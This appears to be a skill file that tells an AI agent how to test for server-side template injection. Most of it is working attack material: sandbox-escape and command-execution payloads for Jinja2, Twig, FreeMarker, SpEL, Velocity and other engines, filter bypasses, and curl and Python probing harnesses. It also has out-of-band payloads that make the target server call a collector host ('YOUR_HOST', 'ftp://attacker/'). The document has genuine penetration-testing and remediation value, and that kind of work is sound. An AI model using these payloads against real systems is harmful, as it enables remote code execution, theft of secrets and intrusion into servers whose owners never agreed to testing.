---
name: attack-ssti
description: "Server-Side Template Injection — template engine fingerprinting, sandbox escape, RCE chains"
category: "web-application"
version: "1.1"
author: "cyberstrike-official"
tags:
  - ssti
  - web
  - injection
  - rce
  - attack
tech_stack:
  - web
  - python
  - nodejs
  - java
  - php
cwe_ids:
  - CWE-1336
  - CWE-94
chains_with:
  - attack-ssrf
  - attack-xxe
prerequisites: []
severity_boost:
  attack-ssrf: "SSTI reaching a URL fetch function = SSRF from inside the app"
  attack-xxe: "SSTI and XXE in the same parser stack = file read plus internal reach"
---

# Server-Side Template Injection (SSTI)

> **AI LOAD INSTRUCTION**: SSTI detection has one reliable first step and one dangerous
> mistake. The reliable step: inject a **mathematical expression** (`{{7*7}}`, `${7*7}`,
> `<%= 7*7 %>`, `#{7*7}`) and look for `49` in the response. The mistake: confusing
> **client-side** rendering with server-side. If the output shows `49`, it is SSTI. If it
> shows the literal string `{{7*7}}`, it is *not* SSTI — it is either reflectable-but-inert or
> client-side templating, and escalating on that guess produces a false report.
>
> The second thing that separates a real finding from a guess: **you must identify the engine
> before you can escape its sandbox.** `${7*7}` working tells you it is not Jinja. `{{7*7}}`
> working tells you it *might* be Jinja, Twig, or a dozen others — and the escape is
> engine-specific. Fingerprint first, then escape.

## 0. RELATED ROUTING

- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) — the long-form companion; load alongside this file
- [attack-ssrf](../attack-ssrf/SKILL.md) — where an SSTI primitive can reach a URL fetcher
- [expression-language-injection](../expression-language-injection/SKILL.md) — the Java EL sibling
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) — the target of most sandbox escapes
- [deserialization-insecure](../deserialization-insecure/SKILL.md) — an overlapping RCE route in Java stacks
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting RCE with defensible proof

---

## 1. DETECTION — THE POLYGLOT PROBE

Send a payload that contains the syntax of many engines at once. Whichever expression
evaluates tells you the family.

```text
${{<%[%'"}}%\.{{7*7}}${7*7}#{7*7}<%= 7*7 %>{{7*'7'}}
```

**Cleaner approach: probe one syntax at a time and record which evaluates.**

| Payload | Evaluates to | Engine family |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2, Twig, Nunjucks, Django (no), Handlebars |
| `{{7*'7'}}` | `7777777` | **Jinja2** (Python string multiply) |
| `{{7*'7'}}` | `49` | **Twig** (PHP coerces to int) |
| `${7*7}` | `49` | FreeMarker, JSP EL, Thymeleaf, Mako |
| `#{7*7}` | `49` | Ruby (ERB), some Java |
| `<%= 7*7 %>` | `49` | ERB, EJS, ASP |
| `${{7*7}}` | `49` | **Velocity** (needs surrounding text in some versions) |
| `{7*7}` | `49` | Smarty (rare) |

**The `{{7*'7'}}` discriminator is the single most useful test in this skill.** It cleanly
separates Jinja2 (`7777777`) from Twig (`49`), which have entirely different escape paths.
Run it immediately after confirming `{{7*7}}` evaluates.

**Context matters more than payload.** Templates are reached through reflected values, so test:

| Context | Example input |
|---|---|
| user profile fields | display name, bio, company |
| email templates | subject line, body, name substitution |
| invoice / report generation | product names, notes |
| error pages | the reflected error message |
| PDF generation | any HTML-to-PDF input |
| notification subjects | alert names, webhook messages |
| file names rendered in listings | uploaded file names |
| i18n / translation | user-submitted strings |

**The highest-yield contexts are the ones that generate email or PDFs.** Those go through a
server-side template renderer almost by definition, and the template often renders
user-supplied strings without escaping — precisely because the developer assumed the input
was "just a name."

---

## 2. FINGERPRINTING THE ENGINE

Once `{{7*7}}` evaluates, identify the engine precisely. The escape depends on it entirely.

| Behaviour | Engine |
|---|---|
| `{{7*'7'}}` → `7777777` | **Jinja2** (Python) |
| `{{7*'7'}}` → `49` | **Twig** (PHP) |
| `{{ config }}` returns an object dump | Jinja2 (Flask) |
| `{{ self }}` returns an object | Jinja2 |
| `{{ _self }}` returns an object | Twig |
| `{{ ''.__class__ }}` works | Jinja2 |
| `{{ _self.env.registerUndefinedFilterCallback(...) }}` | Twig < 1.20 |
| `${"freemarker.template.utility.Execute"?new()("id")}` | FreeMarker |
| `${T(java.lang.Runtime).getRuntime().exec('id')}` | Spring EL / SpEL |
| `#{''.class}` | Ruby ERB / Slim |
| `{{range.constructor("return 1")()}}` | Go `text/template` |
| `=<%= %>` interference | EJS |

**Framework-specific tells worth knowing:**

| Stack | Engine | Distinguishing probe |
|---|---|---|
| Flask / Django | Jinja2 | `{{config}}` |
| Symfony / Drupal | Twig | `{{dump()}}` |
| Spring Boot | Thymeleaf / SpEL | `${...}` and `*{...}` |
| Java (generic) | FreeMarker | `${...?new()}` |
| Rails | ERB | `<%= %>` |
| Express | EJS / Pug | `<%= %>`, `#{ }` |
| Go | text/template | `{{.}}`, `{{printf}}` |

**Send an invalid expression and read the error.** Engines name themselves in their own
error messages — `jinja2.exceptions.TemplateSyntaxError`, `Twig\Error\SyntaxError`, and so
on. **This is the fastest fingerprinting method and the one most testers forget.** The error
page usually also reveals the template path, the framework version, and the working directory.

---

## 3. ESCALATION — JINJA2 (PYTHON)

The goal is `os.popen` or `subprocess` reached through object graph traversal. The principle
is always the same: walk from a built-in to a class that can execute.

**Step 1 — reach the object graph from a string:**

```jinja2
{{ ''.__class__ }}
{{ ''.__class__.__mro__ }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

**Step 2 — find a useful class in the subclass list.** Two reliable targets:

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX] }}
```

| Target class | What it gives you |
|---|---|
| `subprocess.Popen` | direct command execution |
| `os._wrap_close` | reference to the `os` module |
| `warnings.catch_warnings` | reaches `__builtins__`, then `__import__` — **version-independent** |

**Step 3a — the subclass-index route:**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate() }}
```

`XXX` is the index of `subprocess.Popen` in *that* Python build. **You must enumerate it —
the index is not portable.** Dump the list, find the position, then use it.

**Step 3b — the `__builtins__` route, which is far more portable:**

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

`cycler` and `lipsum` are Flask globals available in nearly every Jinja2 context. The
`__globals__` dictionary carries the real `os` module. **Try these before the index route** —
they need no enumeration.

**Step 3c — when `os` is not in globals:**

```jinja2
{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

**Bypasses when specific keywords are filtered:**

| Filter blocks | Bypass |
|---|---|
| `.` (dot) | `{{ ''['__class__'] }}` and `attr` filter: `{{ ''|attr('__class__') }}` |
| `_` (underscore) | `{{ request['__clas'~'s__'] }}` — string concatenation |
| `{{` `}}` | `{% ... %}` statement blocks, or `{%print(...)%}` |
| `"` / `'` | `{{ request.args.x }}` — pull it from the request |
| `[]` | `.__getitem__()` |
| `os` / `popen` | hex/unicode escapes, `|attr` chains, request-arg indirection |

```jinja2
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
{{ (lipsum|attr('__globals__'))['os'].popen('id').read() }}
```

---

## 4. ESCALATION — TWIG (PHP)

Twig's modern versions are hardened. The escape depends heavily on version.

**Twig 1.x (< 1.20) — the `_self` route:**

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
{{ _self.env.setCache("ftp://attacker/") }}{{ _self.env.loadTemplate("backdoor") }}
```

**Twig 1.x / 2.x — filter chain via `map` and `sort`:**

```twig
{{ ['id']|filter('system') }}
{{ ['id']|map('system')|join }}
{{ ['id',""]|sort('system') }}
```

**The `filter` and `map` filters pass a function name directly.** This is the most portable
Twig escape and still works on many deployed versions where the `_self.env` route is patched.

**Sandbox bypass via `_self` in sandboxed mode:**

```twig
{{ _self.env.setExtension(...) }}
{{ _self.env.enableSandbox() }}
{{ _self.env.disableSandbox() }}
```

**When Twig is fully hardened**, the remaining route is often an extension-provided function
(`dump()`, `date()`, or a custom Twig function) that reaches a dangerous PHP callable. Read
the error output for the list of registered functions — `{{ dump() }}` and an invalid function
name both help enumerate them.

---

## 5. ESCALATION — FREEMARKER AND SPEL (JAVA)

**FreeMarker** — the `Execute` utility class is the standard route:

```freemarker
${"freemarker.template.utility.Execute"?new()("id")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Spring Expression Language (SpEL)** — note that this is EL injection, closely related but
distinct:

```text
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.ProcessBuilder).new('id').start()}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

**Both are commonly reached through Thymeleaf** (`__${...}__` preprocessing) or through
Spring's `@Value` and expression parsers.

**The `T()` operator is the SpEL tell** — it references a class by name. If `T(...)` throws a
security error, the `StandardEvaluationContext` has been replaced with the restricted
variant, and the remaining routes are narrower.

---

## 6. BLIND SSTI

No output is reflected. The template renders elsewhere — into an email, a PDF, a log, or a
nightly report.

**Time-based confirmation:**

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('sleep 10',shell=True,stdout=-1).communicate() }}
```

A consistent 10-second delay confirms execution. The delay must be reproducible and must not
appear with a control payload.

**Out-of-band confirmation — preferred when available:**

```jinja2
{{ cycler.__init__.__globals__.os.popen('curl http://YOUR_HOST/ssti-UNIQUETOKEN').read() }}
```

The `curl` equivalent per stack: `curl`/`wget` on Linux, `powershell -c iwr` on Windows,
`file_get_contents` / `fsockopen` in Twig, `URL().openStream()` in FreeMarker.

**State clearly which you achieved.** An OOB callback proves execution; a timing delta is
weaker and needs a proper control.

---

## 7. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| SSTI confirmed and command execution proven | **Critical (P1)** | command output, or an OOB callback containing `id`/`whoami` output |
| SSTI confirmed, sandbox not escaped | **High–Critical (P1/P2)** | expression evaluation shown; assess what the context exposes |
| Blind SSTI with OOB callback | **High (P2)** | listener log with a unique token |
| Blind SSTI, timing only | **Medium (P3)** | repeatable delta with a control |
| Expression evaluates but no dangerous route found | **Medium (P3)** | the evaluated expression |
| Payload reflected literally without evaluation | **Informational (P5)** | the reflected body |

**Do not claim RCE from an evaluated `7*7`.** Arithmetic working proves the engine renders
your input; it does not prove you can escape the sandbox. Report the evaluated expression as
medium and attempt the escape separately.

---

## 8. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the injection point and the full request | the input that reached the renderer |
| the `7*7` → `49` probe | proves server-side evaluation, not client-side |
| the discriminator probe identifying the engine | proves the escape path was the right one |
| the fingerprinting error message | names the engine and version |
| the escape payload with the resulting output | the impact proof |
| for RCE: the command output (`id`, `whoami`, hostname) | unarguable execution proof |
| for blind: the OOB listener entry with a unique token | proves execution without reflection |
| the template path and framework version from the error | scoping and remediation input |
| a **control payload** that should not evaluate | proves the behaviour is evaluation, not reflection |

**The control is not optional here.** A response containing `49` proves nothing unless
`{{6*6}}` also returns `36` and a literal string does not evaluate. Without it, you may be
reading a cached or coincidental value.

**False positives to exclude:**

| Looks like SSTI | Actually |
|---|---|
| `{{7*7}}` reflected literally | no server-side evaluation |
| client-side framework rendered it (Vue/Angular) | the browser did it, not the server |
| `49` appears in the page for an unrelated reason | check with a control expression |
| the WAF returned an error page containing `49` | not evaluation |
| template syntax is only valid in a different context | e.g. inside an HTML attribute |
| a timing delta with no control | could be network variance |

---

## 9. REMEDIATION REFERENCE

1. **Never build templates from user input** — templates are code. Concatenating user data into a template string is equivalent to code injection and no sandbox fully fixes it.
2. **Pass user data as template *variables*, not as template *source* — `render("Hello {{name}}", name=user_input)` is safe; `render("Hello " + user_input)` is not.
3. **Enable the sandbox where the engine offers one** — Jinja2 `SandboxedEnvironment`, Twig `SandboxExtension` with an explicit tag/filter allowlist. It is defence in depth, not a substitute for (1) and (2).
4. **Restrict the autoescape and never mark user input safe** — `|safe`, `Markup()`, and Twig's `raw` filter undo the escaping that prevents XSS and, in some contexts, template re-evaluation.
5. **Run the renderer with least privilege** — a dedicated low-privilege user, no network egress, and no filesystem access beyond the template directory. This limits what an escape achieves.
6. **Never serve raw template errors** — they name the engine, the version, the template path, and the working directory. Return a generic error with a correlation ID.
7. **Keep the engine patched** — Twig's `_self.env` route and FreeMarker's `Execute` availability are version-dependent; many escapes exist only because an old version is deployed.
8. **Do not trust front-end sanitisation** — the probe reaches the server regardless of what the browser did with the input. Validate server-side, at the point of rendering, always.

---

## 10. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did a **template expression evaluate** - arithmetic you computed, not text you sent? | the input reached the engine |
| 2 | Was there a **control** - the same string rendered inert or escaped? | the engine exists and you bypassed escaping |
| 3 | Which **engine and version**, identified from the evaluation semantics? | the payload and the fix |
| 4 | Did evaluation reach **file read, an OS command, or an environment variable**? | the impact |
| 5 | Did the arithmetic **change with the input** (`7*7` -> `49`) rather than a lucky echo? | a real evaluator, not a coincidence |
| 6 | Did you confirm on the **target deployment**, not a local replica? | applicability |
| 7 | Did you **clean up** any file you wrote and any process you started? | engagement integrity |

**A computed arithmetic result is the bar.** A reflected `{{7*7}}` is not a finding; `49` in the rendered
output is the first proof, and file read or command execution is the impact.

---

## 11. EXECUTION PRIMITIVES

SSTI is proven by **an expression that the engine evaluated, identified by its semantics, with the
escaped control**. Every block ends at a computed value or a file read.

### 11.1 The arithmetic probe, and the escaped control

```bash
T="https://target.example"
# the probe, and the control in the same request set - the control is what distinguishes SSTI from reflection
for P in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '{7*7}' '{{7*"7"}}' '${7*"7"}' '{{7*7}}\x00'; do
  printf '%-16s ' "$P"
  curl -sS -G "$T/render" --data-urlencode "name=$P" -o /tmp/ssti.out -w '%{http_code} ' 2>/dev/null
  grep -oE '49|7777777|777777|{{7\*7\*}}|7\*7' /tmp/ssti.out | head -2 | tr '\n' ' '; echo
done
# THE ESCAPED CONTROL: the same characters HTML-encoded, which must NOT evaluate
curl -sS -G "$T/render" --data-urlencode 'name={{7*7}}' | grep -oE '49' | head -1 | sed 's/^/raw       -> /'
curl -sS -G "$T/render" --data-urlencode 'name=%7B%7B7*7%7D%7D' | grep -oE '49' | head -1 | sed 's/^/encoded   -> /'
```

**`49` in the output for `{{7*7}}` and its absence for the encoded form is the first proof.** The encoded
control is what separates template evaluation from a page that simply reflected your string.

### 11.2 Engine fingerprinting by semantics

```python
# each engine has a unique semantic signature; fingerprinting is arithmetic, not guessing
import requests
T = "https://target.example"
PROBES = {
  "jinja2/twig":  ["{{7*7}}", "{{7*'7'}}", "{{'abcd'|upper}}", "{{config}}"],
  "freemarker":   ["${7*7}", "<#assign x=7*7>${x}", "${'abc'?upper_case}"],
  "velocity":     ["#set($x=7*7)$x", "${7*7}"],
  "erb":          ["<%= 7*7 %>", "<%= 'abc'.upcase %>"],
  "smarty":       ["{7*7}", "{math equation='7*7'}"],
  "handlebars":   ["{{#with \"x\" as |y|}}{{y}}{{/with}}", "{{7*7}}"],
  "mako":         ["${7*7}", "<%print(7*7)%>"],
  "razor":        ["@{7*7}", "@(7*7)"],
  "thymeleaf":    ["${7*7}", "[[${7*7}]]", "__${7*7}__::.x"],
  "pebble":       ["{{7*7}}", "{{ 'abc'.toUpperCase() }}"],
}
for engine, probes in PROBES.items():
    hits = []
    for p in probes:
        try:
            r = requests.get(f"{T}/render", params={"name": p}, timeout=10)
            if "49" in r.text or "7777777" in r.text or "ABC" in r.text.upper():
                hits.append((p, r.text[:60].replace("\n", " ")))
        except Exception: pass
    if hits:
        print(f"{engine:14} MATCH  {hits}")
# the DECISIVE pair: 7*7 -> 49 says math; 7*'7' -> 7777777 says string-repeat, i.e. a Python-family engine
```

**`7*'7'` returning `7777777` vs `49` identifies the Python family.** That single pair separates Jinja2
and Twig from Freemarker and Velocity, and the payloads diverge completely from there.

### 11.3 From evaluation to impact, per engine

```python
# ordered by impact: config read, then file read, then command execution
PAYLOADS = {
 "jinja2": {
   "config":  "{{config}}",
   "env":     "{{self.__init__.__globals__.__builtins__.__import__('os').environ}}",
   "file":    "{{''.__class__.__mro__[1].__subclasses__()}}  # find subprocess.Popen, then read via it",
   "cmd":     "{{cycler.__init__.__globals__.os.popen('id').read()}}",
   "cmd2":    "{{lipsum.__globals__.os.popen('id').read()}}",
   "rce":     "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
 },
 "twig": {
   "cmd":     "{{['id']|filter('system')}}",
   "cmd2":    "{{['id']|map('system')|join}}",
   "file":    "{{'/etc/passwd'|file_excerpt(1,30)}}",
   "self":    "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
 },
 "freemarker": {
   "cmd":     "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
   "read":    "<#assign is=...>",
 },
 "velocity": {
   "cmd":     "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime').getRuntime().exec('id'))$rt.waitFor()",
 },
 "smarty": {
   "cmd":     "{system('id')}",
   "cmd2":    "{php}system('id');{/php}",
 },
 "erb": {
   "cmd":     "<%= system('id') %>",
   "read":    "<%= File.read('/etc/passwd') %>",
 },
 "handlebars": {
   "rce":     "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}",
 },
}
for eng, pl in PAYLOADS.items():
    print(f"== {eng} ==")
    for k, v in pl.items(): print(f"   {k:8} {v[:110]}")
print()
print("START WITH THE LOWEST-IMPACT READ (config or env) and only escalate to command execution")
print("if the engagement permits it. `id` is the standard marker, and a WAF may block it - try")
print("`{{7*7}}` first, then work up.")
```

**Escalate one level at a time.** Config read proves the engine is fully reachable; only then does a
command payload belong in the engagement, and only if it is authorised.

### 11.4 The blind variant, with a timing and an out-of-band control

```bash
T="https://target.example"
# BLIND SSTI: no reflection, so use TIME and OUT-OF-BAND, each with its control
echo "--- timing control (innocuous expression, then a sleep) ---"
for P in '{{7*7}}' '{{sleep(5)}}' '{{5*5}}' "{{'a'.__class__.__mro__[1].__subclasses__()}}"; do
  printf '%-45s ' "$P"
  curl -sS -G "$T/submit" --data-urlencode "tpl=$P" -o /dev/null -w 'time=%{time_total}s code=%{http_code}\n' 2>/dev/null
done
echo "--- run the sleep probe THREE times: one slow response is network jitter ---"
for i in 1 2 3; do
  curl -sS -G "$T/submit" --data-urlencode 'tpl={{sleep(5)}}' -o /dev/null -w "  sleep-run$i time=%{time_total}s\n" 2>/dev/null
  curl -sS -G "$T/submit" --data-urlencode 'tpl={{7*7}}' -o /dev/null -w "  ctrl-run$i  time=%{time_total}s\n" 2>/dev/null
done
# OUT-OF-BAND: the most reliable blind proof, using a collector - see the Python block
```

**Three runs each, and the median is the claim.** A single 5-second response is jitter; a consistent
delta between the sleep payload and the arithmetic control is the finding.

### 11.5 The out-of-band collector for blind SSTI

```python
import http.server, socketserver, threading, datetime
HITS = "ssti-oob.jsonl"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        rec = f'{{"t":"{datetime.datetime.utcnow().isoformat()}Z","path":"{self.path}","peer":"{self.client_address[0]}"}}'
        open(HITS, "a").write(rec + "\n"); print("OOB ARRIVAL:", rec)
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass
socketserver.TCPServer.allow_reuse_address = True
srv = socketserver.TCPServer(("0.0.0.0", 8000), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()

print("collector up on :8000")
print()
print("Jinja2 OOB (requires the app to be able to reach you):")
print("  {{cycler.__init__.__globals__.os.popen('curl http://YOUR_HOST:8000/jinja-oob').read()}}")
print("Freemarker OOB:")
print('  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://YOUR_HOST:8000/fm-oob")}')
print("Twig OOB:")
print("  {{['curl http://YOUR_HOST:8000/twig-oob']|filter('system')}}")
print()
print("THE OOB ARRIVAL IS THE CMD-EXECUTION PROOF. It works where output is never returned to you,")
print("which is the usual case for a template rendered into an email, a PDF, or a log.")
```

**The OOB arrival proves command execution where nothing is reflected.** It is the only reliable blind
proof for a template rendered into a channel you cannot read.

### 11.6 The end-to-end harness

```bash
python3 - <<'PY'
import requests, time, os
T = "https://target.example"
print("%-24s %-6s %-10s %s" % ("probe", "code", "time", "output-snippet"))
CASES = [
  ("control-plain",      "hello"),
  ("control-encoded",    "%7B%7B7*7%7D%7D"),
  ("probe-math",         "{{7*7}}"),
  ("probe-string",       "{{7*'7'}}"),
  ("probe-cfg",          "{{config}}"),
  ("probe-sleep",        "{{sleep(4)}}"),
]
for name, payload in CASES:
    t0 = time.perf_counter()
    try:
        r = requests.get(f"{T}/render", params={"name": payload}, timeout=30)
        dt = time.perf_counter() - t0
        snippet = r.text[:80].replace("\n", " ")
        verdict = ""
        if "49" in r.text and name == "probe-math": verdict = "<- EVALUATED"
        if "7777777" in r.text: verdict = "<- PYTHON-FAMILY ENGINE"
        if dt > 3 and name == "probe-sleep": verdict = "<- TIME DELTA, verify with 3 runs"
        print("%-24s %-6s %-10s %s %s" % (name, r.status_code, f"{dt:.2f}s", snippet, verdict))
    except Exception as e:
        print("%-24s ERR %s" % (name, type(e).__name__))
print()
if os.path.exists("ssti-oob.jsonl"):
    print("OOB arrivals:", sum(1 for _ in open("ssti-oob.jsonl")))
    print(open("ssti-oob.jsonl").read()[:400])
else:
    print("no OOB arrivals recorded")
print()
print("FINDING = a computed value (49 / 7777777) or a consistent time delta or an OOB arrival,")
print("          WITH the encoded control rendering inert.")
PY
```

**Computed value, consistent delta, or OOB arrival - each with the encoded control.** Reflection is not
in the list.

---

## 12. EVIDENCE STANDARD — SSTI ARTEFACTS

| Item | Why |
|---|---|
| The **raw probe and its rendered output**, showing the computed value | the evaluation |
| The **encoded control's output**, showing no evaluation | proves escaping is bypassed, not absent |
| The **engine and version**, from the semantic fingerprint | the payload and the fix depend on it |
| The **impact payload's output** (config, file, or `id`) | the severity |
| The **OOB arrival**, for the blind case | proves execution without reflection |
| The **timing runs, three each**, with the arithmetic control's times | separates a sleep from jitter |
| The **request shape** (parameter, body, header, filename) that carried the template | reproducibility |
| Whether the template is **user-editable content** or a developer-authored file | the attack surface's nature |
| The **WAF behaviour** observed, if any | the payload may need encoding |
| Confirmation that **any file written and any process started were removed** | engagement integrity |

Report the **evaluation and the control**: "`GET /render?name=%7B%7B7*7%7D%7D` returns the page with the
literal text `{{7*7}}`, which is the encoded control, and `GET /render?name={{7*7}}` returns `49` in the
rendered title, which is the evaluation. `{{7*'7'}}` returns `7777777`, which identifies a Python-family
engine, and `{{config}}` returned the Flask configuration including `SECRET_KEY` and the database URI,
which the version banner identifies as Jinja2 through Flask 2.2. A command payload
`{{cycler.__init__.__globals__.os.popen('id').read()}}` returned `uid=33(www-data) gid=33(www-data)`,
and the same payload with `curl http://<collector>:8000/ssti-oob` produced an OOB arrival whose peer was
the application server", never "the application is vulnerable to template injection".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| `{{7*7}}` **reflected verbatim** in the response | reflection; nothing evaluated |
| A payload that produced a `500` with **no evaluation evidence** | an error, often from the syntax |
| A **client-side** template rendering your input | that is normal SPA behaviour, not server SSTI |
| A **one-off 5-second** response to a sleep payload | network jitter; the three-run delta is the test |
| A `49` appearing in a page that **always contains `49`** | coincidence; verify with an unusual expression like `{{1337*1337}}` |
| An expression evaluated **only in a local replica** you built | tests your environment |
| A **documentation example** on the target's own help page | not a user-controlled surface |
| An OOB arrival from **your own testing host's IP** | you triggered it, not the app |
| A payload that worked **once across many attempts**, unexplained | an untested hypothesis |
| A config dump containing **only public values** | verify the secret is actually secret |
| A secret, key, or credential reproduced in full | a disclosure |

**A computed value with the encoded control.** Reflection, errors, and coincidental strings are the three
ways this family produces false findings.

---

## 13. REMEDIATION REFERENCE — ENGINE HARDENING

1. **Never build a template from user input; select a pre-authored template by an identifier and pass user data only as context variables** - it removes the entire attack class, and it is the only complete fix.
2. **Use a sandboxed template environment with the dangerous builtins and the attribute-walk paths removed** - Jinja2's `SandboxedEnvironment` and Twig's `sandbox` extension exist for exactly this.
3. **Never pass user input to a template-compilation API, and treat any `from_string` or `compile` call on user data as a defect** - the compile step is where the engine starts parsing the attacker's syntax.
4. **Restrict the template engine's access to objects, and pass only primitives (strings, numbers, lists) as context** - the `__class__`/`__mro__` walk needs an object to start from.
5. **Keep the template engine patched; the sandbox escape techniques are version-specific and are fixed version by version** - an old engine is a reliable escape.
6. **Run the renderer as a least-privileged user, in a container without credentials, and with the filesystem read-only where possible** - it bounds the impact when a bypass succeeds.
7. **Disable or restrict network egress from the rendering service** - it removes the out-of-band proof and much of the value of a command execution.
8. **Encode the rendered output for the context it lands in, and never render a template's output as HTML without escaping** - it prevents the SSTI from chaining into XSS.
9. **Log template compilation and render events with the template's identifier and the caller, and alert on any compilation of a template body that came from a request** - the attack requires a compile, and a compile of user input is anomalous by construction.
10. **Treat user-editable templates (email templates, notification templates, CMS themes) as the highest-risk surface and apply the same controls there as in code** - that is where this defect is most often found in production.
11. **Test every template surface with the arithmetic and string-multiplication probes on every release, and re-test after every engine upgrade** - the sandbox's behaviour changes between versions.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) - the full technique reference
- [expression-language-injection](../expression-language-injection/SKILL.md) - the same defect in SpEL, OGNL, and MVEL
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) - the escalation target once the engine is reached
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - where an unescaped rendered output lands
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) - the file-read payloads an SSTI can carry
